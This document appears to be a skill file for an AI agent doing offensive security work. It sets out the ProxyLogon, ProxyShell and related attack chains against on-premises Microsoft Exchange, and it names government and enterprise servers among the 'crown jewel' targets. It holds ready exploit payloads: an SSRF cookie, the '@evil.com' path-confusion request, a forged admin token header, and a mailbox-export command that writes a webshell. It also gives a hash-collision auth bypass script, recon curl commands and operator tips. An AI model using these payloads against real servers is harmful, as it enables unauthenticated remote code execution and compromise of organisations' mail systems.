---
name: exchange-attacks
description: "Microsoft Exchange ProxyLogon and ProxyShell attack surface — Autodiscover SSRF, /ecp path confusion, backend cookie forging, and pre-auth RCE chains against on-premises 2013/2016/2019. Use when recon exposes OWA, ECP, or Autodiscover endpoints, including where Exchange sits behind a CDN or load balancer."
---

# Microsoft Exchange ProxyLogon / ProxyShell Attack Surface

## Crown Jewel Targets

- On-premises Exchange Server 2013/2016/2019 (400K+ internet-exposed)
- Exchange behind CDN/load balancer (path confusion still works)
- Hybrid Exchange deployments (on-prem + Exchange Online)
- Government/enterprise Exchange servers (high-value targets)
- Exchange instances with delayed patching (check build numbers)
- CAS frontend directly accessible on ports 80/443

## Attack Surface Signals

- URL paths: `/owa/`, `/ecp/`, `/autodiscover/`, `/mapi/`, `/rpc/`
- Headers: `X-OWA-Version`, `X-FEServer`, `X-CalculatedBETarget`
- Login page: OWA login form with Microsoft Exchange branding
- Build numbers visible in OWA page source or `/ecp/` response
- Backend ports 81/444 bound to 0.0.0.0 (network-accessible)

**Source:** Orange Tsai (DEVCORE), Black Hat USA 2021, Pwn2Own 2021
**CVEs:** CVE-2021-26855/27065 (ProxyLogon), CVE-2021-34473/34523/31207 (ProxyShell)
**Affected:** Microsoft Exchange Server 2013, 2016, 2019

## Architecture: Client Access Service (CAS)

Exchange CAS acts as frontend proxy for all client connections. Two IIS sites:
- **Frontend:** Ports 80/443 (public)
- **Backend:** Ports 81/444 (internal, but bound to 0.0.0.0 — network accessible)

Backend protected by Kerberos requiring `ms-Exch-EPI-Token-Serialization` right (normally only Exchange Machine Accounts).

### Frontend → Backend Flow

1. Parse incoming HTTP request
2. Filter headers via blacklist (blocks `X-CommonAccessToken`, `X-IsFromCafe`, etc.)
3. Serialize authenticated user identity into `X-CommonAccessToken`
4. Generate Kerberos ticket for backend
5. Forward request to calculated backend URL

## ProxyLogon (CVE-2021-26855 + CVE-2021-27065)

### SSRF via Cookie (CVE-2021-26855)

`OwaResourceProxyRequestHandler` resolves backend target from `X-AnonResource-Backend` cookie:

```csharp
HttpCookie httpCookie = base.ClientRequest.Cookies["X-AnonResource-Backend"];
this.savedBackendServer = httpCookie.Value;
return new ServerInfoAnchorMailbox(BackEndServer.FromString(this.savedBackendServer), this);
```

The cookie value becomes the backend FQDN in the proxy URL. C#'s `UriBuilder` doesn't validate the host, allowing URL manipulation:

```
Cookie: X-AnonResource-Backend=https://[foo]@internal:443/path#]:444/owa/auth/x.js
```

**Power:** Full-response SSRF with Kerberos auth (Exchange Machine Account identity).

### Auth Bypass via Internal API

SSRF accesses `/proxyLogon.ecp` internal API. The `msExchLogonMailbox` header (ECP-specific) is NOT blocked by the static resource handler's blacklist — it only blocks generic internal headers.

This inconsistency between Frontend handlers allows specifying SYSTEM as the logon identity → valid ECP admin session.

### File Write (CVE-2021-27065)

ECP's `DDIService.svc` wraps Exchange PowerShell via XAML pipelines. `WriteFileActivity` has no path validation:

```csharp
using (StreamWriter sw = new StreamWriter(File.Open(path, FileMode.CreateNew)))
{
    sw.WriteLine(value);
}
```

### Full Chain

1. SSRF via `X-AnonResource-Backend` cookie → access ECP backend
2. Use `msExchLogonMailbox` header → get admin ECP session
3. Invoke `Set-OABVirtualDirectory` via DDIService → write webshell to webroot
4. Execute commands via webshell

**Requirements:** Only port 443 exposed. No credentials needed.

## ProxyShell (CVE-2021-34473 + CVE-2021-34523 + CVE-2021-31207)

### ACL Bypass (CVE-2021-34473)

Path confusion on explicit logon URL:

```http
GET /autodiscover/autodiscover.json?@evil.com/powershell HTTP/1.1
```

The `@evil.com` confuses normalization logic, allowing unauthenticated access to backend endpoints.

### Privilege Escalation (CVE-2021-34523)

`X-Rps-CAT` token deserialized by PowerShell backend. Supply crafted token to impersonate admin:

```
X-Rps-CAT: <base64 of CommonAccessToken with admin SID>
```

### File Write (CVE-2021-31207)

Using elevated PowerShell session:
```powershell
New-MailboxExportRequest -Mailbox admin -ContentFilter ... -FilePath \\127.0.0.1\c$\inetpub\wwwroot\shell.aspx
```

Exports mailbox (containing attacker-crafted email with webshell content) to web directory.

## ProxyOracle (CVE-2021-31196 + CVE-2021-31195)

Plaintext password recovery via padding oracle + reflected XSS on Exchange.

## Testing Methodology

### 1. Identify Exchange Servers

```bash
# Typical Exchange paths
curl -sk https://target/owa/
curl -sk https://target/ecp/
curl -sk https://target/autodiscover/autodiscover.xml
curl -sk https://target/mapi/nspi/

# Version from OWA login page or X-OWA-Version header
```

### 2. Test ProxyLogon SSRF

```http
GET /owa/auth/x.js HTTP/1.1
Host: target
Cookie: X-AnonResource-Backend=internal-exchange/ecp/
Cookie: X-BEResource=internal-exchange/EWS/Exchange.asmx
```

### 3. Test ProxyShell Path Confusion

```http
GET /autodiscover/autodiscover.json?@evil.com/mapi/nspi HTTP/1.1
Host: target
```

If 200 instead of 401 → path confusion works.

### 4. Check Patch Level

```bash
# /owa/ page source contains build number
# /ecp/ also reveals version info
# Compare against known patched versions
```

## IIS Token Cache Auth Bypass (CVE-2022-30209)

Related IIS vulnerability: token cache compares username twice (copy-paste bug), allowing auth bypass with a hash-colliding password:

```python
def HashString(password):
    j = 0
    for c in map(ord, password):
        j = c + (101*j) & 0xffffffff
    return j

# Find collision:
assert HashString('test-password') == HashString('ZeeiJT')
```

Works against Exchange's `HealthMailbox` accounts (auto-cached by Active Monitoring).

## Bug Bounty Relevance

- **CRITICAL**: Pre-auth RCE on 400K+ internet-exposed Exchange servers
- Exchange is in scope for most enterprise bug bounty programs
- Even patched servers may have configuration issues enabling partial exploitation
- The CAS architecture creates a broad attack surface for future vulnerabilities

## Operator Notes (Battle-Tested)

- **Check build number first**: OWA page source contains the exact build number. Compare against known patched versions before testing. Saves time and avoids redundant scanning.
- **ProxyShell path confusion is elegant**: `/autodiscover/autodiscover.json?@evil.com/powershell` — the `@evil.com` breaks normalization logic. Test this simple payload first.
- **Backend ports are network-accessible**: Ports 81/444 are bound to `0.0.0.0`, not `127.0.0.1`. Direct backend access bypasses frontend security entirely.
- **IIS token cache collision**: CVE-2022-30209 lets you auth with a hash-colliding password. Works against auto-cached `HealthMailbox` accounts. Very low duplicate risk.
- **`X-AnonResource-Backend` cookie controls the SSRF destination**: Full-response SSRF with Exchange Machine Account Kerberos identity. This is one of the most powerful SSRF primitives ever found.
- **High duplicate risk on unpatched servers**: Other researchers scan for these continuously. Focus on variant hunting or chain discovery rather than straightforward CVE exploitation.

## Related Skills & Chains

| Pattern | Chain Potential |
|---------|---------------|
| `server-confusion-attacks` | CAS proxy confusion methodology |
| `deserialization-testing` → `references/dotnet-deserialization-advanced.md` | .NET deser on Exchange endpoints |
| `iis-shortname-exploitation` | IIS shortname on Exchange servers |
| `windows-unicode-attacks` | Unicode attacks on IIS/Windows |
| `ssrf-testing` | SSRF chain methodology |
